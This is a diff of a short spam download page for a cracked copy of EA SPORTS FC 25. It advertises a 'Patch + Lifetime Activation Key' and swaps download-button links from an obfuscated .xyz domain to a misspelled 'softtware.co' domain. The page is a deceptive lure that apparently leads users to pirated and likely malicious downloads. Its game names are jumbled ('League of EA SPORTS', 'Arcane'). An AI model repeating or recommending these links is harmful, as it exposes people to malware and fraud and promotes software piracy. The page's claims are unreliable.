@@ -1,9 +1,9 @@
 ## EA SPORTS FC™ 25 Standard Edition Game Download For Pc & Mac [Latest]
 
 
-## <a href="//0x6jwta060624z9l.xyz/?s=2774&g=23&q=Download" target="_blank"  rel="noreferrer noopener" style="padding:7px 15px; height:50px; background: #164277; border: 1px solid #163277; border-radius:5px; color:#fff; font-size:20px;margin-top:10px;margin-bottom:10px;">  🔴➤➤ Download League of EA SPORTS </a>
+## [🔴➤➤ Download League of EA SPORTS](https://softtware.co/dl/)
 
-## <a href="//0x6jwta060624z9l.xyz/?s=2774&g=23&q=Download" target="_blank"  rel="noreferrer noopener" style="padding:7px 15px; height:50px; background: #164277; border: 1px solid #163277; border-radius:5px; color:#fff; font-size:20px;margin-top:10px;margin-bottom:10px;">  🔴➤➤ Download League of EA SPORTS Patch + Lifetime Activation Key </a>
+##  [🔴➤➤ Download League of EA SPORTS Patch + Lifetime Activation Key](https://softtware.co/dl/)
 
 EA SPORTS Arcane Download
 
